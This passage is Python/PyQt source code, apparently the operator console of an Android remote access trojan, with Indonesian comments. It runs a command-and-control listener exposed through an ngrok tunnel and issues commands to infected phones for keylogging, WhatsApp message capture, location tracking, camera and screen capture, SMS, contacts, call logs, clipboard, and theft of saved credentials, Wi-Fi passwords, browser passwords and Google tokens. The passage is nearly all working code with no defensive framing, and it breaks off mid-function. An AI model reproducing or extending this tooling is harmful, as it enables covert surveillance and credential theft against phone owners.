        self.tabs.addTab(self.create_simple_tab("📞 Call Logs", "GET_CALL_LOGS"), "📞 Call Logs")
        self.tabs.addTab(self.create_simple_tab("📱 Apps", "GET_INSTALLED_APPS"), "📱 Apps")
        self.tabs.addTab(self.create_simple_tab("🖼️ Gallery", "GET_GALLERY"), "🖼️ Gallery")
        self.tabs.addTab(self.create_simple_tab("🌐 Browser", "BROWSER_INFO"), "🌐 Browser")
        self.tabs.addTab(self.create_simple_tab("🔐 Accounts", "GET_ACCOUNTS"), "🔐 Accounts")
        self.tabs.addTab(self.create_simple_tab("🔑 Credentials", "DUMP_CREDENTIALS"), "🔑 Credentials")

        layout.addWidget(self.tabs, 1)

        # Command bar
        command_bar = self.create_command_bar()
        layout.addWidget(command_bar)

        return widget

    def create_simple_tab(self, title, command):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        header = QWidget()
        header_layout = QHBoxLayout(header)
        header_layout.setContentsMargins(0, 0, 0, 0)
        
        label = QLabel(f"📊 {title}")
        label.setStyleSheet("font-size: 14px; font-weight: 600; color: #6b7a8a;")
        header_layout.addWidget(label)
        header_layout.addStretch()
        
        btn = QPushButton(f"🔄 Refresh")
        btn.setStyleSheet("font-size: 11px; padding: 4px 12px;")
        btn.clicked.connect(lambda: self.send_command_with_param(command))
        header_layout.addWidget(btn)
        
        layout.addWidget(header)
        
        text = QTextEdit()
        text.setReadOnly(True)
        text.setStyleSheet("""
            QTextEdit {
                background-color: #0a0e17;
                border: none;
                font-family: 'Courier New', monospace;
                font-size: 12px;
                padding: 8px;
                min-height: 300px;
            }
        """)
        text.setObjectName(f"text_{title.replace(' ', '_')}")
        layout.addWidget(text)
        
        setattr(self, f"{title.replace(' ', '_')}_text", text)
        
        return widget

    def create_command_bar(self):
        widget = QWidget()
        layout = QHBoxLayout(widget)
        layout.setContentsMargins(0, 4, 0, 0)

        self.cmd_input = QLineEdit()
        self.cmd_input.setPlaceholderText("Enter command... (e.g., GET_DEVICE_INFO, SMS, ACCOUNTS)")
        self.cmd_input.returnPressed.connect(self.send_command)
        layout.addWidget(self.cmd_input, 1)

        self.send_btn = QPushButton("🚀 Send")
        self.send_btn.setProperty("class", "primary")
        self.send_btn.clicked.connect(self.send_command)
        layout.addWidget(self.send_btn)

        presets = QWidget()
        presets_layout = QHBoxLayout(presets)
        presets_layout.setContentsMargins(0, 0, 0, 0)
        presets_layout.setSpacing(4)

        for cmd in ["GET_DEVICE_INFO", "GET_LOCATION", "SCREENSHOT", "KEYLOG_DUMP", "SMS", "ACCOUNTS", "CONTACTS", "HELP"]:
            btn = QPushButton(cmd.replace("_", " "))
            btn.setStyleSheet("""
                QPushButton {
                    background-color: #0a0e17;
                    border: 1px solid #1a2633;
                    border-radius: 4px;
                    padding: 4px 10px;
                    font-size: 11px;
                    color: #6b7a8a;
                }
                QPushButton:hover {
                    border-color: #00d2ff;
                    color: #00d2ff;
                }
            """)
            btn.clicked.connect(lambda checked, c=cmd: self.set_command(c))
            presets_layout.addWidget(btn)

        layout.addWidget(presets)

        return widget

    def setup_connections(self):
        self.server.server_started.connect(self.on_server_started)
        self.server.server_stopped.connect(self.on_server_stopped)
        self.server.server_error.connect(self.on_server_error)
        self.server.agent_connected.connect(self.on_agent_connected)
        self.server.agent_disconnected.connect(self.on_agent_disconnected)
        self.server.command_response.connect(self.on_command_response)
        self.server.keylog_data.connect(self.on_keylog_data)
        self.server.location_update.connect(self.on_location_update)
        self.server.whatsapp_message.connect(self.on_whatsapp_message)
        self.server.screen_frame.connect(self.on_screen_frame)
        self.server.log_message.connect(self.add_output)

        self.ngrok.tunnel_info.connect(self.on_ngrok_tunnel)
        self.ngrok.error.connect(self.on_ngrok_error)

    # ==================== GET C2 URL ====================
    
    def get_c2_url(self) -> str:
        if self.ngrok_host and self.ngrok_port:
            return f"{self.ngrok_host}:{self.ngrok_port}"
        
        local_ip = self.server.get_local_ip()
        if not local_ip or local_ip == "":
            local_ip = "localhost"
        
        port = self.server.port
        return f"{local_ip}:{port}"

    def get_c2_url_display(self) -> str:
        if self.ngrok_host and self.ngrok_port:
            return f"🌐 {self.ngrok_host}:{self.ngrok_port}"
        
        local_ip = self.server.get_local_ip()
        if not local_ip or local_ip == "":
            local_ip = "localhost"
        
        port = self.server.port
        return f"🌐 {local_ip}:{port}"

    # ==================== START SERVICES ====================
    
    def start_config_server(self):
        if self.config_server and self.config_server.isRunning():
            return
        
        self.config_server = ConfigServer(self.get_c2_url)
        self.config_server.log_message.connect(self.add_output)
        self.config_server.start()
        self.config_indicator.setText("📡 Config: Running on :8080")
        self.config_indicator.setStyleSheet("color: #51cf66;")
        
        local_ip = self.server.get_local_ip()
        if not local_ip or local_ip == "":
            local_ip = "localhost"
        
        self.add_output(f"🌐 Config server started on port 8080 (http://{local_ip}:8080/api/c2)", "success")

    def stop_config_server(self):
        if self.config_server:
            self.config_server.stop()
            self.config_server = None
            self.config_indicator.setText("📡 Config: Stopped")
            self.config_indicator.setStyleSheet("color: #6b7a8a;")

    # ==================== SERVER METHODS ====================

    def start_server(self):
        if self.server_running:
            self.add_output("⚠️ Server already running", "warning")
            return

        port, ok = QInputDialog.getInt(self, "Server Port", "Enter port:", 4444, 1, 65535)
        if not ok:
            return

        self.server.start_server(port)
        self.port_label.setText(f"Port: {port}")
        self.start_btn.setText("⏹️ Stop Server")
        self.start_btn.setProperty("class", "danger")
        self.start_btn.clicked.disconnect()
        self.start_btn.clicked.connect(self.stop_server)
        self.status_dot.setStyleSheet("color: #ffd93d; font-size: 18px;")
        self.status_label.setText("Starting...")
        
        self.start_config_server()

    def stop_server(self):
        if not self.server_running:
            return

        self.server.stop_server()
        self.start_btn.setText("▶️ Start Server")
        self.start_btn.setProperty("class", "primary")
        self.start_btn.clicked.disconnect()
        self.start_btn.clicked.connect(self.start_server)
        self.status_dot.setStyleSheet("color: #ff6b6b; font-size: 18px;")
        self.status_label.setText("Stopped")
        
        self.stop_config_server()

    def on_server_started(self, url: str):
        self.server_running = True
        self.status_dot.setStyleSheet("color: #51cf66; font-size: 18px;")
        self.status_label.setText("Running")
        
        display_url = self.get_c2_url_display()
        self.host_label.setText(display_url)
        
        local_ip = self.server.get_local_ip()
        if not local_ip or local_ip == "":
            local_ip = "localhost"
        
        self.add_output(f"✅ Server started on port {self.server.port}", "success")
        self.add_output(f"📍 Agent connect to: {display_url}", "cyan")
        self.add_output(f"📍 Agent config: http://{local_ip}:8080/api/c2", "cyan")
        self.status_bar.showMessage(f"✅ Server running - Waiting for agents...")

    def on_server_stopped(self):
        self.server_running = False
        self.status_dot.setStyleSheet("color: #ff6b6b; font-size: 18px;")
        self.status_label.setText("Stopped")
        self.host_label.setText("🌐 localhost:4444")
        self.add_output("⏹️ Server stopped", "info")

    def on_server_error(self, error: str):
        self.add_output(f"❌ Server error: {error}", "error")
        self.status_bar.showMessage(f"❌ {error}")

    # ==================== NGROK METHODS ====================

    def start_ngrok_tunnel(self):
        if self.ngrok_running:
            self.add_output("⚠️ Ngrok already running", "warning")
            return

        if not self.server_running:
            self.add_output("⚠️ Start server first before Ngrok!", "warning")
            return

        port = int(self.port_label.text().replace("Port: ", ""))
        self.ngrok.start_ngrok(port)
        self.ngrok_btn.setText("⏹️ Ngrok")
        self.ngrok_btn.setStyleSheet("""
            QPushButton {
                background-color: #0d1520;
                border: 1px solid #ff6b6b;
                border-radius: 6px;
                padding: 8px 16px;
                color: #ff6b6b;
                font-size: 13px;
                font-weight: 500;
            }
            QPushButton:hover {
                background-color: #1a2633;
                border-color: #ff6b6b;
            }
        """)
        self.ngrok_btn.clicked.disconnect()
        self.ngrok_btn.clicked.connect(self.stop_ngrok_tunnel)
        self.ngrok_indicator.setText("🌐 Ngrok: Starting...")
        self.ngrok_indicator.setStyleSheet("color: #ffd93d;")
        self.add_output("🌐 Starting Ngrok tunnel...", "info")

    def stop_ngrok_tunnel(self):
        if not self.ngrok_running:
            return

        self.ngrok.stop_ngrok()
        self.ngrok_running = False
        self.ngrok_host = ""
        self.ngrok_port = 0
        
        self.ngrok_btn.setText("🌐 Ngrok")
        self.ngrok_btn.setStyleSheet("""
            QPushButton {
                background-color: #0d1520;
                border: 1px solid #ffd93d;
                border-radius: 6px;
                padding: 8px 16px;
                color: #ffd93d;
                font-size: 13px;
                font-weight: 500;
            }
            QPushButton:hover {
                background-color: #1a2633;
                border-color: #ffd93d;
            }
        """)
        self.ngrok_btn.clicked.disconnect()
        self.ngrok_btn.clicked.connect(self.start_ngrok_tunnel)
        self.ngrok_indicator.setText("🌐 Ngrok: Stopped")
        self.ngrok_indicator.setStyleSheet("color: #6b7a8a;")
        
        display_url = self.get_c2_url_display()
        self.host_label.setText(display_url)
        self.add_output("⏹️ Ngrok tunnel stopped", "info")

    def on_ngrok_tunnel(self, host: str, port: int):
        self.ngrok_running = True
        self.ngrok_host = host
        self.ngrok_port = port
        
        self.ngrok_indicator.setText(f"🌐 Ngrok: {host}:{port}")
        self.ngrok_indicator.setStyleSheet("color: #51cf66;")
        
        display_url = self.get_c2_url_display()
        self.host_label.setText(display_url)
        
        self.add_output(f"🌐 Ngrok tunnel: {host}:{port}", "success")
        self.add_output(f"📍 Agent connect to: {display_url}", "cyan")
        self.status_bar.showMessage(f"🌐 Ngrok: {host}:{port}")

    def on_ngrok_error(self, error: str):
        self.add_output(f"❌ Ngrok error: {error}", "error")
        self.ngrok_indicator.setText("🌐 Ngrok: Error")
        self.ngrok_indicator.setStyleSheet("color: #ff6b6b;")
        self.status_bar.showMessage(f"❌ Ngrok: {error}")

    # ==================== AGENT METHODS ====================

    def on_agent_connected(self, data: dict):
        agent = Agent(
            id=data.get("id", ""),
            device=data.get("device", ""),
            android=data.get("android", ""),
            manufacturer=data.get("manufacturer", ""),
            connected_at=data.get("connected_at", datetime.now().isoformat()),
            last_seen=data.get("last_seen", datetime.now().isoformat()),
            status=data.get("status", "online"),
            mirroring=data.get("mirroring", False),
            frame_count=data.get("frame_count", 0),
            commands_sent=data.get("commands_sent", 0),
            conn=None,
            buffer=""
        )
        self.agent_data[agent.id] = agent
        self.update_agent_list()
        self.update_stats()
        
        if len(self.agent_data) == 1:
            self.selected_agent = agent.id
            self.add_output(f"🟢 Agent connected: {agent.id[:12]}... ({agent.device})", "success")
            self.add_output(f"📱 Auto-selected agent: {agent.id[:12]}...", "cyan")
        else:
            self.add_output(f"🟢 Agent connected: {agent.id[:12]}... ({agent.device})", "success")

    def on_agent_disconnected(self, agent_id: str):
        if agent_id in self.agent_data:
            agent = self.agent_data.pop(agent_id, None)
            self.update_agent_list()
            self.update_stats()
            
            if self.selected_agent == agent_id:
                if self.agent_data:
                    self.selected_agent = next(iter(self.agent_data.keys()))
                    self.add_output(f"📱 Auto-selected next agent: {self.selected_agent[:12]}...", "cyan")
                else:
                    self.selected_agent = None
            
            self.add_output(f"🔴 Agent disconnected: {agent_id[:12]}...", "error")

    # ================================================================
    # ✅ COMMAND RESPONSE - ROUTING KE TAB MASING-MASING
    # ================================================================

    def on_command_response(self, msg: dict):
        command = str(msg.get("command", "")).strip().upper()
        result = msg.get("result", "")
        
        # ✅ TAMPILKAN DI OUTPUT DENGAN FORMAT YANG LEBIH BAIK
        if isinstance(result, dict):
            if result.get('status') == 'success':
                if 'data' in result:
                    count = result.get('count', len(result.get('data', [])))
                    self.add_output(f"✅ {command}: {count} entries", "success")
                elif 'message' in result:
                    self.add_output(f"✅ {command}: {result.get('message')}", "success")
                else:
                    self.add_output(f"✅ {command}: OK", "success")
            elif result.get('status') == 'error':
                self.add_output(f"❌ {command}: {result.get('message', 'Unknown error')}", "error")
            elif result.get('status') == 'permission_denied':
                self.add_output(f"⚠️ {command}: Permission denied - {result.get('message', '')}", "warning")
            elif result.get('status') == 'unknown':
                self.add_output(f"❌ Unknown command: {command}. Type HELP for available commands", "warning")
            else:
                pass  # Data akan di-routing ke tab spesifik
        
        # ✅ ROUTING KE TAB
        if isinstance(result, (dict, list)):
            try:
                result_str = json.dumps(result, indent=2, ensure_ascii=False)
            except:
                result_str = str(result)[:800]
        else:
            result_str = str(result)[:800]

        # ================================================================
        # ✅ SEMUA ROUTING KE TAB MASING-MASING
        # ================================================================

        # ---------- 1. KEYLOG ----------
        if command in ["KEYLOG_START", "KEYLOG_STOP", "KEYLOG_STATUS", "KEYLOG_DUMP"]:
            if command == "KEYLOG_DUMP":
                if isinstance(result, dict):
                    logs = result.get('logs', 'No logs')
                    count = result.get('count', 0)
                    is_logging = result.get('is_logging', False)
                    self.keylog_text.clear()
                    header = f"=== KEYLOG DUMP ===\nTotal: {count} keystrokes | Logging: {'✅ Active' if is_logging else '❌ Stopped'}\n"
                    self.keylog_text.append(header)
                    self.keylog_text.append("-" * 40)
                    self.keylog_text.append(logs)
                    self.keylog_text.verticalScrollBar().setValue(
                        self.keylog_text.verticalScrollBar().maximum()
                    )
            else:
                self._append_to_tab(self.keylog_text, f"{command}: {result_str[:40000]}")
        
        # ---------- 2. WHATSAPP ----------
        elif any(x in command for x in ["WA_", "WHATSAPP"]):
            if command == "WA_CAPTURE_DUMP":
                if isinstance(result, dict):
                    messages = result.get('messages', 'No messages')
                    count = result.get('count', 0)
                    self.wa_text.clear()
                    header = f"=== WHATSAPP CAPTURE DUMP ===\nTotal: {count} messages\n"
                    self.wa_text.append(header)
                    self.wa_text.append("-" * 40)
                    self.wa_text.append(messages)
                    self.wa_text.verticalScrollBar().setValue(
                        self.wa_text.verticalScrollBar().maximum()
                    )
            elif command == "WA_CAPTURE_STATS":
                if isinstance(result, dict):
                    stats = f"""
    WHATSAPP CAPTURE STATS
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    Capturing   : {'✅ Yes' if result.get('is_capturing') else '❌ No'}
    Messages    : {result.get('message_count', 0)}
    Buffer Size : {result.get('buffer_size_formatted', '0 B')}
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
                    self.wa_text.append(stats)
            elif command == "WA_INFO":
                if isinstance(result, dict):
                    info = f"""
    WHATSAPP INFO
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    Installed   : {'✅ Yes' if result.get('installed') else '❌ No'}
    Version     : {result.get('version_name', 'N/A')}
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
                    self.wa_text.append(info)
            else:
                self._append_to_tab(self.wa_text, f"{command}: {result_str[:300]}")
        
        # ---------- 3. LOCATION ----------
        elif command in ["GET_LOCATION", "GPS_DETAIL", "LOCATION_TRACK_START", "LOCATION_TRACK_STOP", "LOCATION_TRACK_STATUS", "LOCATION_HISTORY"]:
            if isinstance(result, dict):
                if command == "GET_LOCATION" or command == "GPS_DETAIL":
                    lat = result.get('latitude', 'N/A')
                    lng = result.get('longitude', 'N/A')
                    acc = result.get('accuracy', 'N/A')
                    self.location_text.append(f"[{datetime.now().strftime('%H:%M:%S')}] 📍 {lat}, {lng} (acc: {acc}m)")
                elif command == "LOCATION_TRACK_STATUS":
                    is_tracking = result.get('is_tracking', False)
                    history_count = result.get('history_count', 0)
                    self.location_text.append(f"[{datetime.now().strftime('%H:%M:%S')}] 📍 Tracking: {'Active' if is_tracking else 'Stopped'} | History: {history_count}")
                elif command == "LOCATION_HISTORY":
                    history = result.get('history', [])
                    self.location_text.append(f"[{datetime.now().strftime('%H:%M:%S')}] 📍 History: {len(history)} entries")
                else:
                    self._append_to_tab(self.location_text, f"{command}: {result_str[:300]}")
                self.location_text.verticalScrollBar().setValue(
                    self.location_text.verticalScrollBar().maximum()
                )
        
        # ---------- 4. SCREENSHOT ----------
        elif command == "SCREENSHOT":
            if isinstance(result, dict):
                if result.get('status') == 'success':
                    self.screenshot_text.append(f"[{datetime.now().strftime('%H:%M:%S')}] 📸 Screenshot captured! Size: {result.get('size', 0)} bytes")
                else:
                    self.screenshot_text.append(f"[{datetime.now().strftime('%H:%M:%S')}] ❌ {result.get('message', 'Unknown error')}")
                self.screenshot_text.verticalScrollBar().setValue(
                    self.screenshot_text.verticalScrollBar().maximum()
                )
        
        # ---------- 5. RDP / MIRROR ----------
        elif any(x in command for x in ["RDP_", "VIDEO_STREAM"]):
            if isinstance(result, dict):
                status = result.get('status', 'unknown')
                message = result.get('message', '')
                self.mirror_text.append(f"[{datetime.now().strftime('%H:%M:%S')}] {command}: {status} - {message}")
                self.mirror_text.verticalScrollBar().setValue(
                    self.mirror_text.verticalScrollBar().maximum()
                )
        
        
        # ================================================================
        # ✅ SIMPLE TABS HANDLER - Apps, Files, Browser, Gallery, Accounts, Credentials
        # ================================================================
        
        simple_commands = {
            "GET_INSTALLED_APPS": ("Apps_text", "_format_app_list"),
            "GET_FILES_LIST": ("Files_text", "_format_file_list"),
            "BROWSER_INFO": ("Browser_text", "_format_browser_list"),
            "GET_GALLERY": ("Gallery_text", "_format_gallery_list"),
            "GET_ACCOUNTS": ("Accounts_text", "_format_accounts_list"),
            "DUMP_CREDENTIALS": ("Credentials_text", "_format_credentials_list")
        }
        
        if command in simple_commands:
            tab_attr, formatter_method = simple_commands[command]
            if hasattr(self, tab_attr) and isinstance(result, dict):
                text_widget = getattr(self, tab_attr)
                data = result.get('data', [])
                
                if data and isinstance(data, list):
                    formatter = getattr(self, formatter_method, None)
                    if formatter:
                        formatted = formatter(data, result)
                    else:
                        formatted = json.dumps(data, indent=2, ensure_ascii=False)[:3000]
                else:
                    formatted = "No data available"
                
                text_widget.clear()
                text_widget.append(formatted)
                text_widget.verticalScrollBar().setValue(
                    text_widget.verticalScrollBar().maximum()
                )

        # ---------- 6. CONTACTS ----------
        elif command == "GET_CONTACTS" and hasattr(self, "Contacts_text"):
            if isinstance(result, dict):
                contacts = result.get('data', [])
                count = result.get('count', 0)
                formatted = f"📋 CONTACTS ({count})\n"
                formatted += "━" * 50 + "\n\n"
                for i, c in enumerate(contacts, 1):
                    name = c.get('name', 'Unknown')
                    number = c.get('number', 'N/A')
                    formatted += f"{i:2}. 👤 {name}\n"
                    formatted += f"     📞 {number}\n\n"
                if len(contacts) == 0:
                    formatted += "  No contacts found\n"
                self.Contacts_text.clear()
                self.Contacts_text.append(formatted)
                self.Contacts_text.verticalScrollBar().setValue(
                    self.Contacts_text.verticalScrollBar().maximum()
                )
        
        # ---------- 7. SMS ----------
        elif command == "GET_SMS" and hasattr(self, "SMS_text"):
            if isinstance(result, dict):
                sms_list = result.get('data', [])
                count = result.get('count', 0)
                formatted = f"📨 SMS MESSAGES ({count})\n"
                formatted += "━" * 50 + "\n\n"
                for i, sms in enumerate(sms_list, 1):
                    date = sms.get('date', 'N/A')
                    sender = sms.get('from', 'Unknown')
                    body = sms.get('body', '')[:100]
                    formatted += f"{i:2}. [{date}]\n"
                    formatted += f"     📤 {sender}\n"
                    formatted += f"     📝 {body}\n\n"
                if len(sms_list) == 0:
                    formatted += "  No SMS found\n"
                self.SMS_text.clear()
                self.SMS_text.append(formatted)
                self.SMS_text.verticalScrollBar().setValue(
                    self.SMS_text.verticalScrollBar().maximum()
                )
        
        # ---------- 8. CALL LOGS ----------
        elif command == "GET_CALL_LOGS" and hasattr(self, "Call_Logs_text"):
            if isinstance(result, dict):
                calls = result.get('data', [])
                count = result.get('count', 0)
                type_icons = {
                    'Incoming': '📥',
                    'Outgoing': '📤',
                    'Missed': '❌',
                    'Unknown': '📞'
                }
                formatted = f"📞 CALL LOGS ({count})\n"
                formatted += "━" * 50 + "\n\n"
                for i, c in enumerate(calls, 1):
                    date = c.get('date', 'N/A')
                    number = c.get('number', 'Unknown')
                    call_type = c.get('type', 'Unknown')
                    duration = c.get('duration', '0')
                    icon = type_icons.get(call_type, '📞')
                    formatted += f"{i:2}. {icon} {call_type}\n"
                    formatted += f"     📞 {number}\n"
                    formatted += f"     ⏱️ {duration}s | 📅 {date}\n\n"
                if len(calls) == 0:
                    formatted += "  No call logs found\n"
                self.Call_Logs_text.clear()
                self.Call_Logs_text.append(formatted)
                self.Call_Logs_text.verticalScrollBar().setValue(
                    self.Call_Logs_text.verticalScrollBar().maximum()
                )
        
        # ---------- 9. GALLERY ----------
        elif command == "GET_GALLERY" and hasattr(self, "Gallery_text"):
            if isinstance(result, dict):
                images = result.get('data', [])
                count = result.get('count', 0)
                formatted = f"🖼️ GALLERY ({count} images)\n"
                formatted += "━" * 50 + "\n\n"
                for i, img in enumerate(images[:30], 1):
                    name = img.get('name', 'Unknown')
                    date = img.get('date', 'N/A')
                    size = img.get('size', '0 B')
                    formatted += f"{i:2}. 📷 {name}\n"
                    formatted += f"     📅 {date} | 📦 {size}\n\n"
                if len(images) > 30:
                    formatted += f"\n... and {len(images) - 30} more images\n"
                if len(images) == 0:
                    formatted += "  No images found\n"
                self.Gallery_text.clear()
                self.Gallery_text.append(formatted)
                self.Gallery_text.verticalScrollBar().setValue(
                    self.Gallery_text.verticalScrollBar().maximum()
                )
        
        # ---------- 10. INSTALLED APPS ----------
        elif command == "GET_INSTALLED_APPS" and hasattr(self, "Apps_text"):
            if isinstance(result, dict):
                apps = result.get('data', [])
                count = result.get('count', 0)
                formatted = f"📱 INSTALLED APPS ({count})\n"
                formatted += "━" * 50 + "\n\n"
                for i, app in enumerate(apps[:50], 1):
                    name = app.get('name', 'Unknown')
                    package = app.get('package', '')
                    formatted += f"{i:2}. 📱 {name}\n"
                    formatted += f"     📦 {package}\n\n"
                if len(apps) > 50:
                    formatted += f"\n... and {len(apps) - 50} more apps\n"
                if len(apps) == 0:
                    formatted += "  No apps found\n"
                self.Apps_text.clear()
                self.Apps_text.append(formatted)
                self.Apps_text.verticalScrollBar().setValue(
                    self.Apps_text.verticalScrollBar().maximum()
                )
        
        # ---------- 11. FILES ----------
        elif command == "GET_FILES_LIST" and hasattr(self, "Files_text"):
            if isinstance(result, dict):
                files = result.get('data', [])
                path = result.get('path', '/')
                formatted = f"📁 FILES IN {path}\n"
                formatted += "━" * 50 + "\n\n"
                folders = []
                file_list = []
                for f in files:
                    if f.get('is_directory'):
                        folders.append(f)
                    else:
                        file_list.append(f)
                for f in folders[:30]:
                    name = f.get('name', 'Unknown')
                    formatted += f"📁 {name}/\n"
                if folders:
                    formatted += "\n"
                for f in file_list[:50]:
                    name = f.get('name', 'Unknown')
                    size = f.get('size_formatted', '0 B')
                    formatted += f"📄 {name} ({size})\n"
                if len(files) > 80:
                    formatted += f"\n... and {len(files) - 80} more items\n"
                if len(files) == 0:
                    formatted += "  Directory is empty\n"
                self.Files_text.clear()
                self.Files_text.append(formatted)
                self.Files_text.verticalScrollBar().setValue(
                    self.Files_text.verticalScrollBar().maximum()
                )
        
        # ---------- 12. BROWSER ----------
        elif command in ["BROWSER_INFO", "BROWSER_HISTORY", "BROWSER_BOOKMARKS", "BROWSER_TABS", "BROWSER_ALL"] and hasattr(self, "Browser_text"):
            if isinstance(result, dict):
                self.Browser_text.clear()
                if command == "BROWSER_INFO":
                    browsers = result.get('data', [])
                    formatted = f"🌐 BROWSER INFO ({len(browsers)} installed)\n"
                    formatted += "━" * 50 + "\n\n"
                    for b in browsers:
                        name = b.get('name', 'Unknown')
                        version = b.get('version', 'N/A')
                        installed = '✅' if b.get('installed') else '❌'
                        formatted += f"🌐 {name} v{version} {installed}\n"
                elif command == "BROWSER_HISTORY":
                    history = result.get('data', [])
                    formatted = f"🌐 BROWSER HISTORY ({len(history)} entries)\n"
                    formatted += "━" * 50 + "\n\n"
                    for h in history[:30]:
                        title = h.get('title', 'No title')
                        url = h.get('url', '')
                        date = h.get('date', 'N/A')
                        formatted += f"🔗 {title}\n"
                        formatted += f"   📅 {date}\n"
                        formatted += f"   🔗 {url[:80]}...\n\n"
                elif command == "BROWSER_BOOKMARKS":
                    bookmarks = result.get('data', [])
                    formatted = f"🌐 BROWSER BOOKMARKS ({len(bookmarks)})\n"
                    formatted += "━" * 50 + "\n\n"
                    for b in bookmarks[:30]:
                        title = b.get('title', 'No title')
                        url = b.get('url', '')
                        formatted += f"🔖 {title}\n"
                        formatted += f"   🔗 {url[:80]}...\n\n"
                else:
                    formatted = json.dumps(result, indent=2)[:2000]
                self.Browser_text.append(formatted)
                self.Browser_text.verticalScrollBar().setValue(
                    self.Browser_text.verticalScrollBar().maximum()
                )
        
        # ---------- 13. ACCOUNTS ----------
        elif command in ["GET_ACCOUNTS", "GET_GOOGLE_ACCOUNTS"] and hasattr(self, "Accounts_text"):
            if isinstance(result, dict):
                accounts = result.get('data', [])
                count = result.get('count', 0)
                account_icons = {
                    'com.google': '🔵',
                    'com.facebook.auth.login': '🔷',
                    'com.whatsapp': '💬',
                    'default': '📧'
                }
                formatted = f"🔐 {command} ({count})\n"
                formatted += "━" * 50 + "\n\n"
                for i, acc in enumerate(accounts[:30], 1):
                    name = acc.get('name', 'Unknown')
                    acc_type = acc.get('type', 'N/A')
                    icon = account_icons.get(acc_type, account_icons['default'])
                    type_desc = acc_type
                    if 'google' in acc_type.lower():
                        type_desc = 'Google'
                    elif 'facebook' in acc_type.lower():
                        type_desc = 'Facebook'
                    elif 'whatsapp' in acc_type.lower():
                        type_desc = 'WhatsApp'
                    formatted += f"{i:2}. {icon} {name}\n"
                    formatted += f"     🔑 {type_desc}\n\n"
                if len(accounts) > 30:
                    formatted += f"\n... and {len(accounts) - 30} more accounts\n"
                if len(accounts) == 0:
                    formatted += "  No accounts found\n"
                self.Accounts_text.clear()
                self.Accounts_text.append(formatted)
                self.Accounts_text.verticalScrollBar().setValue(
                    self.Accounts_text.verticalScrollBar().maximum()
                )
        
        # ---------- 14. CREDENTIALS ----------
        elif command in ["DUMP_CREDENTIALS", "GET_WIFI_PASSWORDS", "GET_BROWSER_PASSWORDS", "GET_GOOGLE_TOKENS"] and hasattr(self, "Credentials_text"):
            self.Credentials_text.clear()
            self.Credentials_text.append(f"=== {command} ===\n")
            self.Credentials_text.append("━" * 50 + "\n")
            if isinstance(result, dict):
                self.Credentials_text.append(json.dumps(result, indent=2)[:3000])
            else:
                self.Credentials_text.append(str(result))
            self.Credentials_text.verticalScrollBar().setValue(
                self.Credentials_text.verticalScrollBar().maximum()
            )
        
        # ---------- 15. CAMERA ----------
        elif command in ["CAMERA_SNAPSHOT", "CAMERA_INFO"]:
            if isinstance(result, dict):
                if command == "CAMERA_SNAPSHOT":
                    if result.get('status') == 'success':
                        self.add_output(f"📸 Camera snapshot captured ({result.get('camera', 'unknown')} camera)", "success")
                    else:
                        self.add_output(f"❌ Camera failed: {result.get('message')}", "error")
                else:
                    has_back = result.get('has_back_camera', False)
                    has_front = result.get('has_front_camera', False)
                    self.add_output(f"📷 Camera: Back={'✅' if has_back else '❌'} | Front={'✅' if has_front else '❌'}", "info")
        
        # ---------- 16. CLIPBOARD ----------
        elif command == "GET_CLIPBOARD":
            if isinstance(result, dict):
                content = result.get('content', 'Empty')
                self.add_output(f"📋 Clipboard: {content[:200]}", "cyan")
        
        # ---------- 17. DEVICE INFO ----------
        elif command == "GET_DEVICE_INFO":
            if isinstance(result, dict):
                model = result.get('model', 'N/A')
                android = result.get('android_version', 'N/A')
                battery = result.get('battery', 'N/A')
                rooted = '✅' if result.get('is_rooted') else '❌'
                self.add_output(f"📱 {model} | Android {android} | Battery {battery} | Rooted {rooted}", "cyan")
        
        # ---------- 18. DEFAULT ----------
        else:
            if isinstance(result, dict) and result.get('status') != 'unknown':
                self.add_output(f"📥 {command}: {str(result)[:200]}...", "cyan")

        self.update_stats()

    # ================================================================
    # ✅ HELPER UNTUK APPEND KE TAB
    # ================================================================

    def _append_to_tab(self, text_widget, content):
        """Helper untuk append ke tab"""
        if text_widget is None:
            return
        timestamp = datetime.now().strftime("%H:%M:%S")
        text_widget.append(f"[{timestamp}] {content}")
        text_widget.verticalScrollBar().setValue(
            text_widget.verticalScrollBar().maximum()
        )

    # ================================================================
    # ✅ SEND COMMAND DENGAN PARAMETER (UNTUK TOMBOL REFRESH)
    # ================================================================

    def send_command_with_param(self, cmd: str):
        """Send command dengan parameter - untuk tombol refresh di tab"""
        if not cmd:
            return

        if not self.selected_agent and self.agent_data:
            self.selected_agent = next(iter(self.agent_data.keys()))
            self.add_output(f"📱 Auto-selected agent: {self.selected_agent[:12]}...", "cyan")
            self.update_agent_list()

        if not self.selected_agent:
            self.add_output("⏳ Waiting for agent to connect...", "warning")
            return

        if not self.server_running:
            self.add_output("⚠️ Server not running", "error")
            return

        parts = cmd.split(" ", 1)
        command = parts[0].upper()
        params = parts[1] if len(parts) > 1 else ""

        # ✅ MAPPING COMMAND SINGKAT KE COMMAND LENGKAP
        command_map = {
            "SMS": "GET_SMS",
            "CONTACTS": "GET_CONTACTS",
            "CALLS": "GET_CALL_LOGS",
            "CALL": "GET_CALL_LOGS",
            "ACCOUNTS": "GET_ACCOUNTS",
            "APPS": "GET_INSTALLED_APPS",
            "FILES": "GET_FILES_LIST",
            "GALLERY": "GET_GALLERY",
            "BROWSER": "BROWSER_INFO",
            "CREDS": "DUMP_CREDENTIALS",
            "WIFI": "GET_WIFI_PASSWORDS",
            "DEVICE": "GET_DEVICE_INFO",
            "LOCATION": "GET_LOCATION",
            "SCREEN": "SCREENSHOT",
            "CAMERA": "CAMERA_SNAPSHOT",
            "KEYLOG": "KEYLOG_DUMP",
            "KEYLOGS": "KEYLOG_DUMP",
            "WA": "WA_CAPTURE_DUMP",
            "WHATSAPP": "WA_CAPTURE_DUMP",
            "HELP": "HELP"
        }
        
        if command in command_map:
            self.add_output(f"🔄 Mapping '{command}' -> '{command_map[command]}'", "debug")
            command = command_map[command]
        
        if command == "HELP":
            self.show_help()
            return

        self.server.send_command(self.selected_agent, command, params)

    # ================================================================
    # ✅ SEND COMMAND - DARI INPUT BAR
    # ================================================================

    def send_command(self):
        """Send command dari input bar"""
